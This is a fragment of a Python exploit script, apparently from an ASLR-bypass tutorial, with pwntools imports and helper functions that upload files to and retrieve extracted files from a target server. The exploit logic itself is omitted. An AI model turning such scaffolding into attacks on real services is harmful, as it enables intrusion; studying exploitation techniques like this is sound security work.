# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-how-to-bypass-aslr-on-linux-x86_64\resources\x.py
import socket

import requests
from pwn import ELF, args, context, p64, remote, u64
...
def uploadFile(blob: bytes, fileid: int):
    ...
    res = requests.post(
        f"http://{SERVER_IP}:{SERVER_PORT}/upload/{fileid}", files=multipart_form_data
    )
...
def getFile(fileid: int, extract="true"):
    res = requests.get(
        f"http://{SERVER_IP}:{SERVER_PORT}/files/{fileid}?extract={extract}"
    )
    return res
